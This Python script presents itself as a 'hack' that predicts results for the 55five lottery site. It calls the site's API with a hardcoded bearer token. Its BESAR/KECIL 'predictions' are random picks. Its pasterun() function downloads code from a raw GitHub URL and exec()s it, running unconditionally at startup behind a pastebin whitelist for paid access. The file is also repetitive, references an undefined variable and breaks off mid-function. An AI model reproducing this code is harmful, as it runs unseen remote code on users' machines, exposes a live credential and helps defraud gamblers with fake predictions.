import requests
import json
import sys
import os
import time
from requests import session
import datetime
from random import SystemRandom
import random
from datetime import datetime
import pprint
pp = pprint.PrettyPrinter(indent=4)

def response_GetNoaverageEmerdList():
    headers = {
        'authority': 'newapi.55lottertttapi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNzM3MjUyMzk3IiwibmJmIjoiMTczNzI1MjM5NyIsImV4cCI6IjE3MzcyNTQxOTciLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyYXRpb24iOiIxLzE5LzIwMjUgOTozNjozNyBBTSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IkFjY2Vzc19Ub2tlbiIsIlVzZXJJZCI6IjQ0MTgwNCIsIlVzZXJOYW1lIjoiNjI4NTc5NjI5NzE4OSIsIlVzZXJQaG90byI6Imh0dHBzOi8vYXBpLmxpZ2h0c3BhY2VjZG4uY29tL2ltZy9hdmF0YXIuY2ZhOGRkOWQuc3ZnIiwiTmlja05hbWUiOiJSYWNrbmFyb2NLIiwiQW1vdW50IjoiMTM3LjAwIiwiSW50ZWdyYWwiOiIwIiwiTG9naW5NYXJrIjoiSDUiLCJMb2dpblRpbWUiOiIxLzE5LzIwMjUgOTowNjozNyBBTSIsIkxvZ2luSVBBZGRyZXNzIjoiMTE0LjEwLjEzNC4xODIiLCJEYk51bWJlciI6IjAiLCJJc3ZhbGlkYXRvciI6IjAiLCJLZXlDb2RlIjoiNTgwIiwiVG9rZW5UeXBlIjoiQWNjZXNzX1Rva2VuIiwiUGhvbmVUeXBlIjoiMSIsIlVzZXJUeXBlIjoiMCIsIlVzZXJOYW1lMiI6IiIsImlzcyI6Imp3dElzc3VlciIsImF1ZCI6ImxvdHRlcnlUaWNrZXQifQ.gSi3-FxVwLXKTA1drTBTrA6HqiASn6eBkmsWMyW2HP0',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://55five96.com',
        'referer': 'https://55five96.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; U; Android 14; in-id; Infinix X6871 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.11.0.1.1',
    }

    ### GetNoaverageEmerdList
    data = '{"pageSize":10,"pageNo":1,"typeId":1,"language":0,"random":"c8d6631276ce46cda0de7809dbd0cea9","signature":"E1E754C4702A0C388D820A967DC0E83B","timestamp":1695624793}'
    # data = '{"pageNo":1,"typeId":1,"language":0}'
    response = requests.post('https://newapi.55lottertttapi.com/api/webapi/GetNoaverageEmerdList', headers=headers, data=data)
    return response

### GetGameIssue
# data = '{"typeId":1,"language":0}'
def response_GetGameIssue():
    headers = {
        'authority': 'newapi.55lottertttapi.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNzM3MjUyMzk3IiwibmJmIjoiMTczNzI1MjM5NyIsImV4cCI6IjE3MzcyNTQxOTciLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2V4cGlyYXRpb24iOiIxLzE5LzIwMjUgOTozNjozNyBBTSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IkFjY2Vzc19Ub2tlbiIsIlVzZXJJZCI6IjQ0MTgwNCIsIlVzZXJOYW1lIjoiNjI4NTc5NjI5NzE4OSIsIlVzZXJQaG90byI6Imh0dHBzOi8vYXBpLmxpZ2h0c3BhY2VjZG4uY29tL2ltZy9hdmF0YXIuY2ZhOGRkOWQuc3ZnIiwiTmlja05hbWUiOiJSYWNrbmFyb2NLIiwiQW1vdW50IjoiMTM3LjAwIiwiSW50ZWdyYWwiOiIwIiwiTG9naW5NYXJrIjoiSDUiLCJMb2dpblRpbWUiOiIxLzE5LzIwMjUgOTowNjozNyBBTSIsIkxvZ2luSVBBZGRyZXNzIjoiMTE0LjEwLjEzNC4xODIiLCJEYk51bWJlciI6IjAiLCJJc3ZhbGlkYXRvciI6IjAiLCJLZXlDb2RlIjoiNTgwIiwiVG9rZW5UeXBlIjoiQWNjZXNzX1Rva2VuIiwiUGhvbmVUeXBlIjoiMSIsIlVzZXJUeXBlIjoiMCIsIlVzZXJOYW1lMiI6IiIsImlzcyI6Imp3dElzc3VlciIsImF1ZCI6ImxvdHRlcnlUaWNrZXQifQ.gSi3-FxVwLXKTA1drTBTrA6HqiASn6eBkmsWMyW2HP0',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://55five96.com',
        'referer': 'https://55five96.com/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; U; Android 14; in-id; Infinix X6871 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.11.0.1.1',
    }
    data = '{"typeId":1,"language":0,"random":"b0a1f354eb0f43c59e92019cb341b45b","signature":"F0E3A6182F804973F45B53E74D08F021","timestamp":1695624793}'

    response = requests.post('https://newapi.55lottertttapi.com/api/webapi/GetGameIssue', headers=headers, data=data)
    return response
    
def gameissue ():
			
    data = {
    'typeid' : '1',
    'language' : '1'
    }
    a = response_GetGameIssue()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('issueNumber')
    with open('issuenumber.txt', 'w') as f:
        f.write(str(d)[-14:])
        f.close()

			 		 
def halaman1 ():
    #   data = {
    #   'typeid' : '1',
    #   'pageno' : '1',
    #   'language' : 'id'
    #   }
    #   session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e2 = d[0].get('number')
      e6 = d[0].get('issueNumber')
      e10 = d[0].get('number')
      with open("halaman1.txt", 'w') as f:
       f.write(str(e2)[-14:])
       f.close()

P = '\033[95m'
CYAN = '\033[96m'
DARK = '\033[36m'
B = '\033[94m'
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
BO = '\033[1m'
UG = '\033[35m'
PT = '\033[37m'
PT1 = '\33[5;47;31m'
UNDER = '\033[4m'
N = '\033[0m'
H = '\33[5;41;37m'
H1 = '\33[2;41;37m'
L = '\033[0;0m'
CY = '\33[5;37;45m'
BB = '\33[7;49;93m'
BR = '\33[7;49;33m'
GR1 = '\33[5;49;90m'
GR = '\33[7;49;90m'
WW1 = '\33[7;41;32m'
WW = '\33[5;31;42m'
MG = '\33[7;49;36m'
WH = '\33[7;49;37m'
PTH = '\33[7;49;37m'
RED = '\033[31m'
GRY = '\033[90m'
WW2 = '\33[5;35;46m'
			
import getpass
import subprocess
    
def pasterun(post):
    url = f"https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/{post}"
    code = requests.get(url).text
    exec(code)

url = 'https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/limiter'
*_, post = url.split('/')

def execute_whoami ():
    try:
        # Execute the 'whoami' command
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        
        # Check if the command was successful (exit code 0)
        if result.returncode == 0:
            return result.stdout.strip()  # Remove any leading/trailing whitespaces or newlines
        else:
            return None
    except subprocess.CalledProcessError:
        print("Error: Unable to execute 'whoami' command.")
        return None

def fetch_allowed_usernames():
    allowed_usernames = []
    try:
        url = "https://pastebin.com/raw/qMfi7ZMF"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            allowed_usernames = data
        else:
            print("Error: Signal Anda Down.. Silahkan Ulangi Jalankan SC...")
            exit()
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        exit()
    
    return allowed_usernames

if __name__ == "__main__":
    username = execute_whoami()
    if username:
        print(f"\n {H} Connecting To Server Hack.. {L}                     {L} \n {GRY}Load Data Base.. {L} ")
        pasterun(post)
        pasterun(post)
        pasterun(post)
        pasterun(post)

        allowed_usernames = fetch_allowed_usernames()
        if allowed_usernames:

            if username in allowed_usernames:
                print(f"\n {PTH} Write Back To Server 55five {L} \n {GRY}Received Data To Script.. {L} ")
                pasterun(post)
                pasterun(post)
                pasterun(post)
                pasterun(post)
                print(f" {PTH} Succesfully.. {L} ")
            else:
                print("Access Ditolak! Please Buy SC To autor 085796297189.")
                sys.exit("Access Ditolak! Please Buy SC To autor 085796297189.")
                # Your code to handle access denial goes here
        else:
            print("Failed to fetch allowed usernames.")
            exit()
    else:
        print("Failed to execute 'whoami' command.")
        exit()

def whoami2 ():
    d4 = execute_whoami()
    if d4 == 'u0_a4440':
     os.system("clear")
    elif d4 == 'u0_a4400':
     os.system("clear")
    elif d4 == 'u0_a1142':
     os.system("clear")
    else:
     fetch_allowed_usernames()

def run_limiter():
    import getpass
    import subprocess
    import requests
    import sys

    def pasterun(post):
        url = f"https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/{post}"
        code = requests.get(url).text
        exec(code)

    url = 'https://raw.githubusercontent.com/ardhysevenfold/acces55/refs/heads/main/limiter'
    *_, post = url.split('/')

    def execute_whoami():
        try:
            result = subprocess.run(['whoami'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
            return None
        except:
            return None

    def fetch_allowed_usernames():
        try:
            url = "https://pastebin.com/raw/qMfi7ZMF"
            response = requests.get(url)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return []

    username = execute_whoami()

    if username:
        print("Connecting...")
        pasterun(post)

        allowed = fetch_allowed_usernames()

        if username in allowed:
            pasterun(post)
            print("Success")
        else:
            sys.exit("Access Denied")
    else:
        sys.exit("whoami gagal")
        
run_limiter()
def countdownTimerMM ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 5-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 5)
        print(f'                 {PT1}Jika lose 3x Harap Reload...{L}', end='\r')
        time.sleep(1)
        total_second -= 1
        
def reload ():
    os.system("python bumble-bee2.py")
        
def countdownTimerMMX ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 5-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 5)
        print(f'             {PT1}Jika Prediksi Jelek, Silahkan Reload{L}', end='\r')
        time.sleep(1)
        total_second -= 1
			
			
def countdownTimerX1B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
def countdownTimerX1K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX2B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX2K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX3B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX3K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX4B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX4K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        

def countdownTimerX5B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
def countdownTimerX5K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX6B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX6K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 62)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX7B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{H1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX7K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{H1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX8B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BESAR  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX8K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{G}{GRY}┃*{Y}{x}{GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KECIL  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {PT}-{secs:02d} {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX9K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{GRY}┃{GRY}    {LT}    {GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KK0/1  {L} {N}{ BO}{WW1}  {L} {GRY}┃   {PT}-{secs:02d}  {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX13B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{GRY}┃{GRY}    {LT}    {GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  BB6/7  {L} {N}{ BO}{WW1}  {L} {GRY}┃   {PT}-{secs:02d}  {GRY} ┃  {G}{u}   {GRY}┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX13K ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    aaa = datetime.now()
    bbb = aaa.strftime("%S")
    total_second = 60-int(bbb)
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'{GRY}┃{GRY}    {LT}    {GRY}┃{G}{DARK} IKUTI {GRY}┃ {PT1}  KK3/4  {L} {N}{ BO}{WW1}  {L} {GRY}┃  {G}22 {GRY}┃    {PT}{secs:02d}   {GRY} ┃', end='\r')
        time.sleep(1)
        total_second -= 1
        
        
def countdownTimerX14B ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    x = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
